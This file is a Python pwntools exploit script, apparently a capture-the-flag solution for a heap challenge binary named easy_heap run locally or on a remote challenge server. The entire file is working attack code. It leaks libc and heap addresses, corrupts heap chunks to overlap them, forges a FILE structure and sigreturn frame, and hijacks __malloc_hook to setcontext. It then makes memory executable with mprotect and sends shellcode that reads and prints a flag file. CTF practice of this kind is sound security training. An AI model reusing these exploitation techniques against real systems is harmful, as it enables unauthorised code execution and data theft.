#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./easy_heap'
#context.arch='amd64'
while True :
	# try :
		elf=ELF(elfelf)
		context.arch=elf.arch

		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			libc=ELF('/glibc/x64/2.31/lib/libc-2.31.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]

		else :
			io=remote('node4.buuoj.cn',26049)
			libc=ELF('../../x64libc/libc-2.30.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		n=[]
		s=[]

		for i in range(0xff):
			n.append(0)
			s.append(0)

		def add(a):
			io.sendlineafter('Choice:','1')
			io.sendlineafter('Size: ',str(a))
			global n,s
			for i in range(len(n)):
				if n[i]==0:
					n[i]=1
					s[i]=a
					break
			
		def edit(a,b):
			io.sendlineafter('Choice:','2')
			io.sendlineafter('Index: ',str(a))
			io.sendafter('Content: \n',b)

		def show(a):
			io.sendlineafter('Choice:','4')
			io.sendlineafter('Index: ',str(a))

		def delete(a):
			io.sendlineafter('Choice:','3')
			io.sendlineafter('Index: ',str(a))
			global n,s
			s[a]=0
			n[a]=0

		def view(n,s):
			for i in range(0x10):
				success("heap ["+str(i)+"]: "+hex(s[i]))

		add(0x4f8)
		add(0xf8)
		add(0xf8)
		add(0xf8)
		add(0x4f8)
		add(0xf8)
		add(0xf8)
		delete(0)
		add(0x4f8)
		delete(2)
		delete(1)
		add(0xf8)
		add(0xf8)
		show(0)
		libc_base=u64(io.recvuntil('[',drop=True)[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']
		show(1)
		heap_base=u64(io.recvuntil('[',drop=True)[-6:]+'\x00\x00')-0x100-0x500
		
		shellcode_addr=(heap_base)&0xfffffffffffff000
		pay=p64(heap_base+0x210)+p64(0x7f1)+p64(heap_base+0x50)
		pay+=p64(heap_base+0x50)+p64(heap_base)*0x10
		edit(0,pay)
		edit(3,'\x00'*0xf0+p64(0x7f0))
		delete(4)
		delete(6)
		delete(5)
		delete(1)
		add(0x4d8)
		add(0x78)
		edit(4,p64(0)+p64(0x101)+p64(libc.sym['_IO_2_1_stderr_']+0x68))
		add(0xf8)
		add(0xf8)

		frame_address=heap_base+0x10+0xe0 #SROP_addr
		IO_str_jumps=libc.sym['_IO_file_jumps']+0xc0
		IO='\x00'*0x28
		IO+=p64(frame_address)
		IO=IO.ljust(0xd8,'\x00')
		IO+=p64(IO_str_jumps)
		
		frame=SigreturnFrame()
		frame.rax=0
		frame.rdi=shellcode_addr
		frame.rsi=0x2000
		frame.rdx=7
		frame.rsp=heap_base
		frame.rip=libc.sym['mprotect']
		IO+=str(frame)
		shell1='''
		xor rdi,rdi
		mov rsi,%d
		mov rdx,0x1000
		xor rax,rax

		syscall
		jmp rsi
		'''%shellcode_addr
		IO=IO.ljust(0x200,'\x00')
		IO+=asm(shell1)
		edit(1,IO)
		edit(6,p64(heap_base+0x10)[:-1])
		delete(5)
		edit(4,p64(0)+p64(0x101)+p64(libc.sym['__malloc_hook']))
		add(0xf8)
		add(0xf8)
		edit(7,p64(libc.sym['setcontext']+61))
		io.sendlineafter('Choice:','5')

		shell2='''
		mov  rax,0x67616c662f2e
		push rax
		mov  rdi,rsp
		mov  rsi,0x0
		xor  rdx,rdx
		mov  rax,0x2
		syscall

		mov  rdi,rax
		mov  rsi,rsp
		mov  rdx,0x100
		mov  rax,0x0
		syscall

		mov  rdi,0x1
		mov  rsi,rsp
		mov  rdx,0x100
		mov  rax,0x1
		syscall
		'''
		io.sendline(asm(shell2))

		view(n,s)
		success('libc_base:'+hex(libc_base))
		success('heap_base:'+hex(heap_base))
		
		# gdb.attach(io)
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue